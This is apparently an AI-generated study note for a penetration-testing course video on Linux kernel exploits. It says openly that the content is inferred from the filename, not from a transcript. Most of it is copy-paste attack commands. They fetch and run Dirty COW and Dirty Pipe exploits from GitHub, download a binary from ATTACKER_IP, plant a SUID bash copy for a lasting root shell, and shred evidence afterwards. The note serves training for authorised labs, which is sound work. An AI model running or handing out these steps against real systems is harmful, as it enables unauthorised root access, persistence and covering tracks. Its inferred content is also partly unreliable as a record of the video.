# What the video covers (Introduction / big picture)
Note: The transcript is not available; the following is inferred conservatively from the filename and folder context (03-LinuxPrivilegeEscalation/01 - Linux Kernel Exploits.mp4).

This module introduces Linux kernel exploits as a privilege escalation path. It focuses on:
- Enumerating kernel and distro details reliably.
- Assessing exploitability and mitigations.
- Finding trustworthy public PoCs with exploit suggesters and SearchSploit.
- Building or transferring a working binary (including static cross-compiles).
- Executing safely, validating root, and cleaning up.

Kernel exploits are typically a last resort in eJPT-style assessments after checking misconfigurations, SUID abuses, and service weaknesses due to their crash risk and dependency on exact versions/mitigations.

# Flow (ordered)
1. Enumerate kernel, distro, architecture, and patch provenance.
2. Check mitigations that affect local kernel exploits (SMEP/SMAP/KASLR/SELinux).
3. Use exploit suggesters to shortlist relevant CVEs for the target kernel/distro.
4. Research a specific CVE/PoC; confirm affected versions and mitigations handled by the PoC.
5. Build the exploit (locally on target if gcc is present; otherwise cross-compile static on attacker).
6. Transfer the binary to an executable location on the target.
7. Run the exploit cautiously; monitor for instability.
8. Verify escalation (id, whoami) and establish persistence or a safe root shell (e.g., SUID bash copy).
9. Clean up artifacts; revert any PoC changes if applicable.

# Tools highlighted
- System enumeration: uname, cat /proc/version, /etc/os-release, lsb_release, getconf, dpkg/rpm, dmesg.
- Mitigation checks: sysctl, /boot/config-$(uname -r), /proc/cpuinfo.
- Suggesters: linux-exploit-suggester (LES), linux-exploit-suggester-2 (LES2), linPEAS.
- Exploit discovery: searchsploit (Exploit-DB), CVE advisories, vendor kernel changelogs.
- Build toolchains: gcc/cc on target; musl-gcc or gcc -static on attacker; gcc-multilib for 32-bit.
- File transfer: wget, curl, scp, python3 -m http.server.
- Examples of notable LPEs to research: Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), OverlayFS (CVE-2015-1328/8660), perf_swevent (CVE-2013-2094), futex/Towelroot (CVE-2014-3153), keyring (CVE-2016-0728).

# Typical command walkthrough (detailed, copy-paste friendly)
Only run in authorized lab environments. Prefer /dev/shm or /tmp for staging.

- Enumerate kernel, distro, arch, package provenance:
```
id; whoami
uname -a
cat /proc/version
cat /etc/os-release 2>/dev/null || cat /etc/issue
lsb_release -a 2>/dev/null
getconf LONG_BIT; arch
# Kernel packages (Debian/Ubuntu vs RHEL/CentOS/Fedora)
dpkg -l | egrep 'linux-image|linux-headers' 2>/dev/null || rpm -qa | egrep 'kernel|kernel-core|kernel-devel'
# Check if running in container/VM
grep -E 'docker|lxc|container' /proc/1/cgroup 2>/dev/null || true
```

- Check mitigations and relevant kernel config:
```
# SMEP/SMAP presence
grep -iE 'smap|smep' /proc/cpuinfo
dmesg | grep -iE 'smap|smep' 2>/dev/null

# KASLR (kernel address randomization) indication
dmesg | grep -i 'randomize' 2>/dev/null
cat /boot/config-$(uname -r) 2>/dev/null | grep -i RANDOMIZE_BASE

# Other knobs that impact some PoCs
sysctl kernel.kptr_restrict kernel.dmesg_restrict kernel.perf_event_paranoid kernel.unprivileged_userns_clone 2>/dev/null
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
cat /boot/config-$(uname -r) 2>/dev/null | egrep 'CONFIG_USER_NS|CONFIG_KEYS|CONFIG_KALLSYMS|CONFIG_MODULES'
```

- Shortlist candidate exploits:
```
cd /dev/shm 2>/dev/null || cd /tmp

# linux-exploit-suggester (LES)
wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
chmod +x les.sh
./les.sh

# linux-exploit-suggester-2 (LES2)
wget -q https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl -O les2.pl
perl les2.pl
```

- Search Exploit-DB for PoCs:
```
# Broad search by kernel major.minor
ver=$(uname -r | cut -d- -f1); echo "Kernel base: $ver"
searchsploit "Linux Kernel $ver" "local privilege escalation"

# If you have a specific CVE from LES
searchsploit CVE-2016-5195
# Mirror an exploit to current dir (example ID; replace with your target)
# searchsploit -m linux/local/xyz.c
```

- Build the exploit on target (if gcc present):
```
which gcc || which cc
# Example: compile with static if possible; fall back to dynamic
gcc exploit.c -O2 -static -o exploit 2>/dev/null || gcc exploit.c -O2 -o exploit
```

- Cross-compile static on attacker (Kali/Debian) if target lacks gcc:
```
# On attacker
sudo apt update
sudo apt -y install build-essential musl-tools
musl-gcc exploit.c -Os -static -s -o exploit

# Serve & fetch
python3 -m http.server 8000
# On target
cd /dev/shm 2>/dev/null || cd /tmp
wget http://ATTACKER_IP:8000/exploit -O exploit
chmod +x exploit
```

- Run and validate:
```
./exploit
id; whoami
uname -a
```

- Establish a durable root shell (example SUID bash copy; use only in labs):
```
cp /bin/bash /tmp/bashroot
chmod u+s /tmp/bashroot
# Later: run as any user to get root
/tmp/bashroot -p
```

- Cleanup (revert PoC changes if it modified /etc/passwd):
```
shred -u exploit exploit.c les.sh les2.pl 2>/dev/null || rm -f exploit exploit.c les.sh les2.pl
# If a PoC edited /etc/passwd or other system files, restore backups it created (often *.bak)
```

- Example PoC flows (choose one that matches your kernel/distro):
  - Dirty COW (CVE-2016-5195; many kernels < 4.8.3; vendors backport patches—verify):
```
cd /dev/shm 2>/dev/null || cd /tmp
wget -q https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c -O dirtycow.c
gcc dirtycow.c -pthread -O2 -o dirtycow
./dirtycow
id
```
  - Dirty Pipe (CVE-2022-0847; affects Linux 5.8–5.16.11/5.15.25/5.10.102 before fixes; stable on many distros without backports):
```
cd /dev/shm 2>/dev/null || cd /tmp
wget -q https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c -O dirtypipe.c
gcc dirtypipe.c -O2 -o dirtypipe
./dirtypipe
id
```
Adjust PoCs as needed; prefer reputable sources and read code/README for usage and mitigation handling (SMEP/SMAP bypass, KASLR assumptions, etc.).

# Practical tips
- Prefer stability: Some kernel PoCs can panic the system. Run in screen/tmux and be prepared to reconnect.
- Match more than uname -r: Vendors backport fixes. Verify distro kernel package changelogs and PoC’s detection routines. Ubuntu/Debian kernels often include “-generic/-cloud” variants with backported patches.
- Architecture matters: Compile for the target arch and bitness (getconf LONG_BIT; file /bin/sh). For 32-bit: gcc -m32 … and install gcc-multilib on the attacker.
- Mitigations: Choose PoCs that handle SMEP/SMAP; many modern PoCs disable SMEP via CR4 flipping with ROP/kpti trampolines. KASLR often irrelevant for many LPEs, but check PoC notes.
- Execution locations: If /tmp is noexec, use /dev/shm or /var/tmp. If no outbound access, scp in or host an internal HTTP server.
- Kernel headers typically not required: Most LPE PoCs are userland programs abusing kernel bugs; they rarely need kernel headers on target.
- Container nuance: Containerized targets may restrict some namespace/syscall paths; some kernel bugs still escalate to host if the kernel is shared and vulnerable—exercise extreme caution and follow scope.
- Post-ex: Prefer transient root shells (not file overwrites) in real engagements. In labs, if a PoC modifies /etc/passwd or binaries, document and revert.
- Always read the PoC: Confirm affected versions, required sysctls, and whether it already drops a root shell or requires post-steps.

# Minimal cheat sheet (one-screen flow)
```
# 1) Enumerate
id; uname -a
cat /etc/os-release 2>/dev/null || cat /etc/issue
getconf LONG_BIT; arch
dpkg -l | egrep 'linux-image|linux-headers' 2>/dev/null || rpm -qa | egrep 'kernel|kernel-core|kernel-devel'

# 2) Mitigations
grep -iE 'smap|smep' /proc/cpuinfo
dmesg | grep -iE 'smap|smep|randomize' 2>/dev/null
sysctl kernel.kptr_restrict kernel.perf_event_paranoid 2>/dev/null

# 3) Suggesters
cd /dev/shm 2>/dev/null || cd /tmp
wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh && chmod +x les.sh && ./les.sh
wget -q https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl -O les2.pl && perl les2.pl

# 4) Search and fetch a PoC (example uses SearchSploit)
ver=$(uname -r | cut -d- -f1); searchsploit "Linux Kernel $ver" "local privilege escalation"

# 5) Build (on target if possible; else cross-compile static on attacker)
gcc exploit.c -O2 -static -o exploit 2>/dev/null || gcc exploit.c -O2 -o exploit
chmod +x exploit

# 6) Run & verify
./exploit
id

# 7) Optional: SUID shell (lab use)
cp /bin/bash /tmp/bashroot && chmod u+s /tmp/bashroot && /tmp/bashroot -p

# 8) Cleanup
rm -f exploit exploit.c les.sh les2.pl
```

# Summary
This lesson covers the end-to-end process of using Linux kernel exploits for privilege escalation: enumerate precise kernel/distro details, assess mitigations, shortlist candidate CVEs using exploit-suggester tools, locate reliable PoCs with SearchSploit, compile locally or cross-compile static binaries, transfer and execute carefully, validate root access, and clean up. Kernel LPEs are powerful but risky—verify vendor backports, choose PoCs that handle mitigations like SMEP/SMAP, and favor minimally invasive techniques, especially outside lab environments.